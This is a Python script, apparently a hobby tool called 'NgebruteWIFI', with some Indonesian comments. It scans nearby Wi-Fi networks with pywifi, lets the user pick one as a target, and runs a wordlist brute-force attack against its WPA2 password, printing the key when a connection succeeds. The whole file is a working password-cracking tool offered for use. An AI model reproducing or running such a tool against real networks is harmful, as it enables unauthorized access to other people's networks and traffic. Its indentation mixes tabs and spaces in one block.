from pywifi import PyWiFi, const, Profile
import time
import argparse
import os

class main:
	def scan_wifi(self):
		print(r""" _   _            _                _    __          _______ ______ _____ 
| \ | |          | |              | |   \ \        / /_   _|  ____|_   _|
|  \| | __ _  ___| |__  _ __ _   _| |_ __\ \  /\  / /  | | | |__    | |  
| . ` |/ _` |/ _ \ '_ \| '__| | | | __/ _ \ \/  \/ /   | | |  __|   | |  
| |\  | (_| |  __/ |_) | |  | |_| | ||  __/\  /\  /   _| |_| |     _| |_ 
|_| \_|\__, |\___|_.__/|_|   \__,_|\__\___| \/  \/   |_____|_|    |_____|
        __/ |                                                            
       |___/                                                             """)
		wifi = PyWiFi()
		iface = wifi.interfaces()[0]
		iface.scan()
		time.sleep(3)
		scan_results = iface.scan_results()
		wifi_name_set = set()
		for w in scan_results:
			wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8', "ignore"))
			wifi_name_set.add(wifi_name_and_signal)
		return wifi_name_set

	def print_sorted_wifi(self, wifi_name_list):
		no = 0
		w_name = list(wifi_name_list)
		list_name_w = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
		
		print("-" * 40)
		print("\r{:<6}{:<13}{}".format("No", "Frequency", "SSID"))
		print("-" * 40)

		for res_list_wifi in list_name_w:
			no += 1
			print("\r{:<6d}{:<13d}{}".format(no, res_list_wifi[0], res_list_wifi[1] if res_list_wifi[1] else "*SSID Not Detect"))

		print("-" * 40)
		print("Please select with the command press 'Ctrl+C' to select the target (Number)")

		return list_name_w


	def login_wifi(self, wifi_name, wordlist):
		wl = wordlist

		with open(wl, "r") as file_wl:
			wl_lines = file_wl.readlines()
			wifi = PyWiFi()
			interface = wifi.interfaces()[0]
			interface.disconnect()
			time.sleep(3)
			
			results = interface.scan_results()

			#cek ketersediaan ssid
			found = any(network.ssid == wifi_name for network in results)
			if not found:
				print(f"SSID '{wifi_name}' not found. Make sure the network is available.")
				return 
			print(f"SSID '{wifi_name}' found. Starting the login process...")


			for wl_res in wl_lines:
				#menghapus "\n"
				password_crack = wl_res.strip()
				
				#konek ke jaringan
				profile = Profile()
				profile.ssid = wifi_name
				profile.auth = const.AUTH_ALG_OPEN
				profile.akm.append(const.AKM_TYPE_WPA2PSK)
				profile.cipher = const.CIPHER_TYPE_CCMP
				profile.key = password_crack
				interface.remove_all_network_profiles()
				tmp_profile = interface.add_network_profile(profile)
				interface.connect(tmp_profile)
				time.sleep(2)

				if interface.status() == const.IFACE_CONNECTED:
					print("[+++] PASSWORD IS CORRECT = ", password_crack)
					break
				else:
					print("[-] WRONG PASSWORD = ", password_crack)
					continue
	def __init__(self, wordlist):
		try:
			while True:
				os.system("clear")
				scan_wifi = self.scan_wifi()
				sorted_wifi = self.print_sorted_wifi(scan_wifi)
				time.sleep(4)
		except KeyboardInterrupt:
			try:
				input_name_ssid = int(input("Enter the numbers to be executed: "))
				if 1 <= input_name_ssid <= len(sorted_wifi):
				    selected_ssid = sorted_wifi[input_name_ssid - 1]
					# self.login_wifi(selected_ssid[1])
				    print("-" * 40)
				    print("\rYou choose SSID: {} with the number {}".format(selected_ssid[1] if selected_ssid[1] else "(Hidden SSID)", input_name_ssid))
				    print("-" * 40)
				    self.login_wifi(selected_ssid[1], wordlist)
				else:
					print("Number is out of range. Please enter the appropriate numbers.")
			except ValueError:
				print("Invalid input. Please enter a number.")



if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-w", "--wordlist", help="Enter your wordlist", type=str, required=True)
	args = parser.parse_args()
	if args.wordlist:
		main(args.wordlist)
